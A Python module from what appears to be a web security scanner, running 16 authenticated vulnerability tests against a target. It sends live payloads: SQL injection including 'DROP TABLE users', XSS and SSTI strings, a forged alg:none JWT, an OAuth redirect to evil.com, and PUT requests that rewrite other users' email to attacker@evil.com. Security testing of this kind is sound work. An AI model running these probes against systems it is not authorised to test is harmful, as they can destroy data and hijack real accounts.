# src/oneinfinity/auth/authenticated_test_suite.py
"""
16 post-login security test categories.
Each test_* method returns list[Finding].
run_all() executes all categories and returns combined findings.
"""
from __future__ import annotations
import base64
import json
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

if TYPE_CHECKING:
    from oneinfinity.auth.auth_session_context import AuthSessionContext

log = logging.getLogger(__name__)

_PII_PATTERNS = [
    re.compile(r"\b\d{3}-\d{2}-\d{4}\b"),
    re.compile(r"\b4[0-9]{12}(?:[0-9]{3})?\b"),
    re.compile(r"\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b"),
    re.compile(r'"password"\s*:\s*"[^"]+"'),
    re.compile(r'(api_key|secret|token)\s*[:=]\s*["\']?\w{20,}', re.I),
]

_SQLI_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "1 AND 1=1", "1; DROP TABLE users--"]
_XSS_PAYLOADS = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "';alert(1)//"]
_SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]


@dataclass
class Finding:
    vuln_type: str
    title: str
    severity: str           # critical | high | medium | low | info
    url: str
    evidence: str
    payload: str
    parameter: str
    confidence: float = 0.8
    source_type: str = "auth_test"
    finding_id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    tool: str = "authenticated_test_suite"

    def to_dict(self) -> dict:
        return {k: v for k, v in self.__dict__.items()}


class AuthenticatedTestSuite:
    def __init__(self, target: str, endpoints: list[str], auth_context: "AuthSessionContext") -> None:
        self.target = target
        self.endpoints = endpoints or [target]
        self.auth_context = auth_context
        self._session = auth_context.session

    def run_all(self) -> list[Finding]:
        """Run all 16 test categories. Never raises — errors are logged."""
        tests = [
            self.test_session_management,
            self.test_cookie_security,
            self.test_access_control,
            self.test_idor,
            self.test_csrf,
            self.test_jwt,
            self.test_graphql_auth,
            self.test_api_discovery,
            self.test_sensitive_data,
            self.test_rate_limiting,
            self.test_business_logic,
            self.test_oauth,
            self.test_mfa_bypass,
            self.test_password_operations,
            self.test_account_takeover,
            self.test_injection_auth,
        ]
        findings: list[Finding] = []
        for test_fn in tests:
            try:
                findings.extend(test_fn())
            except Exception as exc:
                log.warning("AuthTestSuite: %s failed — %s", test_fn.__name__, exc)
        return findings

    # ── 1. Session Management ──────────────────────────────────────────────────

    def test_session_management(self) -> list[Finding]:
        findings: list[Finding] = []
        import httpx
        session_cookie_name = next(
            (c["name"] for c in self._session.cookies if "sess" in c["name"].lower()),
            next((c["name"] for c in self._session.cookies), ""),
        )
        if not session_cookie_name:
            return findings

        logout_url = next(
            (e for e in self.endpoints if any(k in e.lower() for k in ["/logout", "/signout", "/auth/logout"])),
            None,
        )
        if logout_url:
            try:
                with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                    self.auth_context.inject_httpx(client)
                    old_cookie_val = next(
                        (c["value"] for c in self._session.cookies if c["name"] == session_cookie_name), ""
                    )
                    client.get(logout_url)
                    test_url = self.target
                    resp = client.get(test_url, cookies={session_cookie_name: old_cookie_val})
                    if resp.status_code == 200 and not self.auth_context.is_session_expired(resp):
                        findings.append(Finding(
                            vuln_type="session_not_invalidated",
                            title="Session not invalidated after logout",
                            severity="high",
                            url=logout_url,
                            evidence=f"Session cookie {session_cookie_name} still valid after logout. Response: {resp.status_code}",
                            payload=f"{session_cookie_name}={old_cookie_val}",
                            parameter=session_cookie_name,
                        ))
            except Exception as exc:
                log.debug("test_session_management logout check: %s", exc)

        return findings

    # ── 2. Cookie Security ─────────────────────────────────────────────────────

    def test_cookie_security(self) -> list[Finding]:
        findings: list[Finding] = []
        for c in self._session.cookies:
            name = c.get("name", "")
            if not name:
                continue
            is_session_cookie = any(k in name.lower() for k in ["sess", "auth", "token", "jwt"])
            if not c.get("httpOnly") and is_session_cookie:
                findings.append(Finding(
                    vuln_type="missing_httponly",
                    title=f"Cookie '{name}' missing HttpOnly flag",
                    severity="medium",
                    url=self._session.login_url,
                    evidence=f"Cookie '{name}' does not have HttpOnly flag set. JavaScript can read this cookie.",
                    payload="",
                    parameter=name,
                    confidence=1.0,
                ))
            if not c.get("secure") and self._session.target.startswith("https"):
                findings.append(Finding(
                    vuln_type="missing_secure_flag",
                    title=f"Cookie '{name}' missing Secure flag",
                    severity="medium",
                    url=self._session.login_url,
                    evidence=f"Cookie '{name}' does not have Secure flag. Could be sent over HTTP.",
                    payload="",
                    parameter=name,
                    confidence=1.0,
                ))
            same_site = (c.get("sameSite") or "").lower()
            if same_site in ("none", "") and is_session_cookie:
                findings.append(Finding(
                    vuln_type="missing_samesite",
                    title=f"Cookie '{name}' missing SameSite flag",
                    severity="low",
                    url=self._session.login_url,
                    evidence=f"Cookie '{name}' SameSite={same_site or 'not set'} — CSRF risk.",
                    payload="",
                    parameter=name,
                    confidence=0.9,
                ))
        return findings

    # ── 3. Access Control ──────────────────────────────────────────────────────

    def test_access_control(self) -> list[Finding]:
        findings: list[Finding] = []
        import httpx
        auth_only_endpoints = [e for e in self.endpoints if any(
            k in e for k in ["/api/", "/admin/", "/dashboard", "/profile", "/account", "/user"]
        )][:10]

        try:
            with httpx.Client(verify=False, follow_redirects=False, timeout=10) as client:
                for url in auth_only_endpoints:
                    try:
                        resp = client.get(url)
                        if resp.status_code == 200:
                            findings.append(Finding(
                                vuln_type="broken_access_control",
                                title=f"Authenticated endpoint accessible without auth: {url}",
                                severity="high",
                                url=url,
                                evidence=f"GET {url} returned HTTP {resp.status_code} without any authentication",
                                payload="",
                                parameter="",
                                confidence=0.85,
                            ))
                    except Exception:
                        pass
        except Exception as exc:
            log.debug("test_access_control: %s", exc)
        return findings

    # ── 4. IDOR ───────────────────────────────────────────────────────────────

    def test_idor(self) -> list[Finding]:
        findings: list[Finding] = []
        import httpx
        id_pattern = re.compile(r"/(\d{1,10})(?:/|$|\?)")
        id_endpoints = [e for e in self.endpoints if id_pattern.search(e)][:15]

        try:
            with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in id_endpoints:
                    m = id_pattern.search(url)
                    if not m:
                        continue
                    original_id = int(m.group(1))
                    for test_id in {original_id + 1, original_id - 1, original_id + 10, 1, 2}:
                        if test_id <= 0:
                            continue
                        test_url = url[:m.start(1)] + str(test_id) + url[m.end(1):]
                        try:
                            resp = client.get(test_url)
                            if resp.status_code == 200 and len(resp.text) > 50:
                                orig_resp = client.get(url)
                                size_ratio = len(resp.text) / max(len(orig_resp.text), 1)
                                if 0.5 < size_ratio < 2.0:
                                    findings.append(Finding(
                                        vuln_type="idor",
                                        title=f"Possible IDOR at {urlparse(url).path}",
                                        severity="high",
                                        url=test_url,
                                        evidence=f"Object ID {original_id} → {test_id} returned HTTP 200 with {len(resp.text)} bytes",
                                        payload=str(test_id),
                                        parameter="id",
                                        confidence=0.7,
                                    ))
                                    break
                        except Exception:
                            pass
        except Exception as exc:
            log.debug("test_idor: %s", exc)
        return findings

    # ── 5. CSRF ───────────────────────────────────────────────────────────────

    def test_csrf(self) -> list[Finding]:
        findings: list[Finding] = []
        import httpx
        state_change_endpoints = [e for e in self.endpoints if any(
            k in e.lower() for k in ["/update", "/delete", "/create", "/change", "/reset", "/transfer"]
        )][:10]
        try:
            with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in state_change_endpoints:
                    try:
                        resp = client.request("POST", url, data={"test": "csrf_probe"})
                        if resp.status_code in (200, 201, 204):
                            findings.append(Finding(
                                vuln_type="csrf",
                                title=f"Possible CSRF at {urlparse(url).path}",
                                severity="medium",
                                url=url,
                                evidence=f"POST {url} accepted without CSRF token validation (HTTP {resp.status_code})",
                                payload="test=csrf_probe",
                                parameter="",
                                confidence=0.6,
                            ))
                    except Exception:
                        pass
        except Exception as exc:
            log.debug("test_csrf: %s", exc)
        return findings

    # ── 6. JWT ────────────────────────────────────────────────────────────────

    def test_jwt(self) -> list[Finding]:
        findings: list[Finding] = []
        import httpx
        jwts: list[str] = []
        for v in self._session.auth_headers.values():
            if isinstance(v, str) and "eyJ" in v:
                token = v.replace("Bearer ", "").strip()
                if token:
                    jwts.append(token)
        for v in self._session.local_storage.values():
            if isinstance(v, str) and v.startswith("eyJ"):
                jwts.append(v)

        if not jwts:
            return findings

        for jwt_token in jwts[:3]:
            parts = jwt_token.split(".")
            if len(parts) != 3:
                continue

            try:
                header_data = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
                if header_data.get("alg", "").lower() == "none":
                    findings.append(Finding(
                        vuln_type="jwt_alg_none",
                        title="JWT using 'none' algorithm — authentication bypass possible",
                        severity="critical",
                        url=self._session.login_url,
                        evidence=f"JWT header declares alg=none: {header_data}",
                        payload=jwt_token[:50] + "...",
                        parameter="Authorization",
                        confidence=1.0,
                    ))
                none_header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "none", "typ": "JWT"}).encode()
                ).rstrip(b"=").decode()
                none_token = f"{none_header}.{parts[1]}."
                test_url = next((e for e in self.endpoints if "/api/" in e), self.target)
                try:
                    with httpx.Client(verify=False, timeout=10) as client:
                        resp = client.get(test_url, headers={"Authorization": f"Bearer {none_token}"})
                        if resp.status_code == 200:
                            findings.append(Finding(
                                vuln_type="jwt_alg_none_bypass",
                                title="JWT alg:none bypass confirmed — server accepted unsigned token",
                                severity="critical",
                                url=test_url,
                                evidence="Server returned 200 with unsigned (alg:none) JWT",
                                payload=none_token,
                                parameter="Authorization",
                                confidence=1.0,
                            ))
                except Exception:
                    pass
            except Exception:
                pass

            try:
                payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
                exp = payload_data.get("exp", 0)
                if exp and exp < time.time():
                    test_url = next((e for e in self.endpoints if "/api/" in e), self.target)
                    with httpx.Client(verify=False, timeout=10) as client:
                        resp = client.get(test_url, headers={"Authorization": f"Bearer {jwt_token}"})
                        if resp.status_code == 200:
                            findings.append(Finding(
                                vuln_type="jwt_expired_accepted",
                                title="Expired JWT accepted — token expiry not validated",
                                severity="high",
                                url=test_url,
                                evidence=f"JWT expired at {exp} but server returned 200",
                                payload=jwt_token[:50] + "...",
                                parameter="Authorization",
                                confidence=0.9,
                            ))
            except Exception:
                pass

        return findings

    # ── 7. GraphQL Auth ───────────────────────────────────────────────────────

    def test_graphql_auth(self) -> list[Finding]:
        findings: list[Finding] = []
        import httpx
        gql_endpoints = [e for e in self.endpoints if any(k in e.lower() for k in ["/graphql", "/gql", "/api/graphql"])]
        if not gql_endpoints:
            gql_endpoints = [urljoin(self.target, "/graphql"), urljoin(self.target, "/api/graphql")]

        introspection_query = '{"query":"{ __schema { types { name } } }"}'
        try:
            with httpx.Client(verify=False, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in gql_endpoints[:3]:
                    try:
                        resp = client.post(url, content=introspection_query,
                                           headers={"Content-Type": "application/json"})
                        if resp.status_code == 200 and "__schema" in resp.text:
                            findings.append(Finding(
                                vuln_type="graphql_introspection_exposed",
                                title="GraphQL introspection enabled (post-login)",
                                severity="medium",
                                url=url,
                                evidence="GraphQL introspection returned full schema.",
                                payload=introspection_query,
                                parameter="",
                                confidence=1.0,
                            ))
                    except Exception:
                        pass
        except Exception as exc:
            log.debug("test_graphql_auth: %s", exc)
        return findings

    # ── 8. API Discovery ──────────────────────────────────────────────────────

    def test_api_discovery(self) -> list[Finding]:
        import httpx
        findings: list[Finding] = []
        _js_api_pattern = re.compile(r'["\'](/api/[^"\'?\s]+|/v\d+/[^"\'?\s]+)["\']')
        new_endpoints: set[str] = set()

        try:
            with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in self.endpoints[:5]:
                    try:
                        resp = client.get(url)
                        for match in _js_api_pattern.finditer(resp.text):
                            ep = urljoin(self.target, match.group(1))
                            if ep not in self.endpoints:
                                new_endpoints.add(ep)
                    except Exception:
                        pass
        except Exception as exc:
            log.debug("test_api_discovery: %s", exc)

        if new_endpoints:
            findings.append(Finding(
                vuln_type="authenticated_api_discovery",
                title=f"Discovered {len(new_endpoints)} authenticated-only API endpoints",
                severity="info",
                url=self.target,
                evidence="Endpoints found only after authentication:\n" + "\n".join(sorted(new_endpoints)[:20]),
                payload="",
                parameter="",
                confidence=0.9,
            ))
        return findings

    # ── 9. Sensitive Data ─────────────────────────────────────────────────────

    def test_sensitive_data(self) -> list[Finding]:
        import httpx
        findings: list[Finding] = []
        try:
            with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in self.endpoints[:15]:
                    try:
                        resp = client.get(url)
                        for pat in _PII_PATTERNS:
                            m = pat.search(resp.text)
                            if m:
                                findings.append(Finding(
                                    vuln_type="sensitive_data_exposure",
                                    title=f"Sensitive data pattern found in response at {urlparse(url).path}",
                                    severity="high",
                                    url=url,
                                    evidence=f"Pattern matched: ...{m.group(0)[:60]}...",
                                    payload="",
                                    parameter="",
                                    confidence=0.75,
                                ))
                                break
                    except Exception:
                        pass
        except Exception as exc:
            log.debug("test_sensitive_data: %s", exc)
        return findings

    # ── 10. Rate Limiting ─────────────────────────────────────────────────────

    def test_rate_limiting(self) -> list[Finding]:
        import httpx
        findings: list[Finding] = []
        rate_endpoints = [e for e in self.endpoints if any(
            k in e.lower() for k in ["/login", "/otp", "/verify", "/password/reset", "/2fa", "/mfa"]
        )][:3]
        if not rate_endpoints:
            rate_endpoints = [self._session.login_url]

        try:
            with httpx.Client(verify=False, timeout=10) as client:
                for url in rate_endpoints:
                    statuses: list[int] = []
                    for _ in range(20):
                        try:
                            resp = client.post(url, data={"username": "test", "password": "wrongpass"})
                            statuses.append(resp.status_code)
                        except Exception:
                            break
                    rate_limited = any(s in (429, 423, 503) for s in statuses)
                    locked_out = any(s == 403 for s in statuses[10:])
                    if not rate_limited and not locked_out and len(statuses) >= 15:
                        findings.append(Finding(
                            vuln_type="no_rate_limiting",
                            title=f"No rate limiting on {urlparse(url).path}",
                            severity="medium",
                            url=url,
                            evidence=f"Sent 20 POST requests — no 429/423/lockout observed. Status codes: {set(statuses)}",
                            payload="username=test&password=wrongpass",
                            parameter="",
                            confidence=0.8,
                        ))
        except Exception as exc:
            log.debug("test_rate_limiting: %s", exc)
        return findings

    # ── 11. Business Logic ────────────────────────────────────────────────────

    def test_business_logic(self) -> list[Finding]:
        import httpx
        findings: list[Finding] = []
        cart_endpoints = [e for e in self.endpoints if any(
            k in e.lower() for k in ["/cart", "/order", "/checkout", "/purchase", "/payment", "/price"]
        )][:5]
        test_payloads = [
            {"quantity": "-1"},
            {"quantity": "0"},
            {"price": "0.01"},
            {"amount": "-100"},
            {"quantity": "99999"},
        ]
        try:
            with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in cart_endpoints:
                    for data in test_payloads:
                        try:
                            resp = client.post(url, data=data)
                            if resp.status_code in (200, 201):
                                findings.append(Finding(
                                    vuln_type="business_logic",
                                    title=f"Business logic bypass possible at {urlparse(url).path}",
                                    severity="high",
                                    url=url,
                                    evidence=f"POST {url} with {data} returned HTTP {resp.status_code}",
                                    payload=str(data),
                                    parameter=list(data.keys())[0],
                                    confidence=0.65,
                                ))
                                break
                        except Exception:
                            pass
        except Exception as exc:
            log.debug("test_business_logic: %s", exc)
        return findings

    # ── 12. OAuth / SSO ───────────────────────────────────────────────────────

    def test_oauth(self) -> list[Finding]:
        import httpx
        findings: list[Finding] = []
        oauth_endpoints = [e for e in self.endpoints if any(
            k in e.lower() for k in ["/oauth", "/authorize", "/callback", "/token", "/sso"]
        )][:5]
        try:
            with httpx.Client(verify=False, follow_redirects=False, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in oauth_endpoints:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    if "redirect_uri" in params:
                        evil_url = urlunparse(parsed._replace(
                            query=urlencode({**{k: v[0] for k, v in params.items()},
                                            "redirect_uri": "https://evil.com/callback"})
                        ))
                        try:
                            resp = client.get(evil_url)
                            if resp.status_code in (301, 302):
                                location = resp.headers.get("location", "")
                                if "evil.com" in location:
                                    findings.append(Finding(
                                        vuln_type="oauth_redirect_uri_manipulation",
                                        title="OAuth redirect_uri manipulation — open redirect",
                                        severity="high",
                                        url=url,
                                        evidence=f"Redirected to: {location}",
                                        payload="redirect_uri=https://evil.com/callback",
                                        parameter="redirect_uri",
                                        confidence=0.95,
                                    ))
                        except Exception:
                            pass
        except Exception as exc:
            log.debug("test_oauth: %s", exc)
        return findings

    # ── 13. MFA Bypass ────────────────────────────────────────────────────────

    def test_mfa_bypass(self) -> list[Finding]:
        import httpx
        findings: list[Finding] = []
        mfa_endpoints = [e for e in self.endpoints if any(
            k in e.lower() for k in ["/mfa", "/2fa", "/otp", "/verify", "/totp"]
        )][:5]
        try:
            with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in mfa_endpoints:
                    try:
                        resp = client.post(url, json={"code": "000000"})
                        body = resp.text.lower()
                        if resp.status_code == 200 and any(k in body for k in ['"success":false', '"valid":false', '"verified":false']):
                            findings.append(Finding(
                                vuln_type="mfa_response_manipulation",
                                title="MFA endpoint returns parseable JSON — response manipulation possible",
                                severity="high",
                                url=url,
                                evidence=f"Response body: {resp.text[:200]}",
                                payload='{"code":"000000"}',
                                parameter="code",
                                confidence=0.6,
                            ))
                    except Exception:
                        pass
        except Exception as exc:
            log.debug("test_mfa_bypass: %s", exc)
        return findings

    # ── 14. Password Operations ───────────────────────────────────────────────

    def test_password_operations(self) -> list[Finding]:
        import httpx
        findings: list[Finding] = []
        pw_endpoints = [e for e in self.endpoints if any(
            k in e.lower() for k in ["/password/change", "/change-password", "/update-password", "/account/password"]
        )][:5]
        try:
            with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in pw_endpoints:
                    try:
                        resp = client.post(url, data={
                            "new_password": "Tr0ub4d@r&3",
                            "confirm_password": "Tr0ub4d@r&3",
                        })
                        if resp.status_code in (200, 204):
                            findings.append(Finding(
                                vuln_type="password_change_no_old_password",
                                title="Password change accepted without current password",
                                severity="high",
                                url=url,
                                evidence=f"POST {url} returned {resp.status_code} without old_password field",
                                payload="new_password=Tr0ub4d@r&3&confirm_password=Tr0ub4d@r&3",
                                parameter="old_password",
                                confidence=0.7,
                            ))
                    except Exception:
                        pass
        except Exception as exc:
            log.debug("test_password_operations: %s", exc)
        return findings

    # ── 15. Account Takeover ──────────────────────────────────────────────────

    def test_account_takeover(self) -> list[Finding]:
        import httpx
        findings: list[Finding] = []
        profile_endpoints = [e for e in self.endpoints if any(
            k in e.lower() for k in ["/profile", "/account", "/user/", "/me"]
        )][:5]
        id_pattern = re.compile(r"/(\d+)")
        try:
            with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in profile_endpoints:
                    m = id_pattern.search(url)
                    if not m:
                        continue
                    original_id = int(m.group(1))
                    for test_id in [original_id + 1, original_id - 1]:
                        if test_id <= 0:
                            continue
                        test_url = url[:m.start(1)] + str(test_id) + url[m.end(1):]
                        try:
                            resp = client.put(test_url, json={"email": "attacker@evil.com"})
                            if resp.status_code in (200, 204):
                                findings.append(Finding(
                                    vuln_type="account_takeover_via_idor",
                                    title=f"Account takeover via IDOR at {urlparse(url).path}",
                                    severity="critical",
                                    url=test_url,
                                    evidence=f"PUT {test_url} with attacker email returned {resp.status_code}",
                                    payload='{"email":"attacker@evil.com"}',
                                    parameter="id",
                                    confidence=0.85,
                                ))
                        except Exception:
                            pass
        except Exception as exc:
            log.debug("test_account_takeover: %s", exc)
        return findings

    # ── 16. Injection (post-login) ────────────────────────────────────────────

    def test_injection_auth(self) -> list[Finding]:
        import httpx
        findings: list[Finding] = []
        all_payloads = [
            ("sqli", p, "critical") for p in _SQLI_PAYLOADS
        ] + [
            ("xss", p, "high") for p in _XSS_PAYLOADS
        ] + [
            ("ssti", p, "high") for p in _SSTI_PAYLOADS
        ]

        try:
            with httpx.Client(verify=False, follow_redirects=True, timeout=10) as client:
                self.auth_context.inject_httpx(client)
                for url in self.endpoints[:10]:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    if not params:
                        continue
                    for param_name in list(params.keys())[:3]:
                        for vuln_type, payload, severity in all_payloads[:6]:
                            test_params = {**{k: v[0] for k, v in params.items()}, param_name: payload}
                            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                            try:
                                resp = client.get(test_url)
                                body = resp.text
                                if vuln_type == "sqli" and any(err in body.lower() for err in [
                                    "sql syntax", "mysql_fetch", "ora-", "sqlite", "unclosed quotation",
                                    "quoted string not properly terminated",
                                ]):
                                    findings.append(Finding(
                                        vuln_type="sqli_authenticated",
                                        title=f"SQL injection in authenticated endpoint: {param_name}",
                                        severity=severity,
                                        url=test_url,
                                        evidence=f"SQL error in response: {body[:200]}",
                                        payload=payload,
                                        parameter=param_name,
                                    ))
                                    break
                                elif vuln_type == "xss" and payload in body:
                                    findings.append(Finding(
                                        vuln_type="xss_authenticated",
                                        title=f"XSS in authenticated endpoint: {param_name}",
                                        severity=severity,
                                        url=test_url,
                                        evidence=f"Payload reflected in response: {payload}",
                                        payload=payload,
                                        parameter=param_name,
                                    ))
                                    break
                                elif vuln_type == "ssti" and "49" in body:
                                    findings.append(Finding(
                                        vuln_type="ssti_authenticated",
                                        title=f"SSTI in authenticated endpoint: {param_name} (7*7=49)",
                                        severity=severity,
                                        url=test_url,
                                        evidence="Template expression evaluated: 7*7=49",
                                        payload=payload,
                                        parameter=param_name,
                                    ))
                                    break
                            except Exception:
                                pass
        except Exception as exc:
            log.debug("test_injection_auth: %s", exc)
        return findings
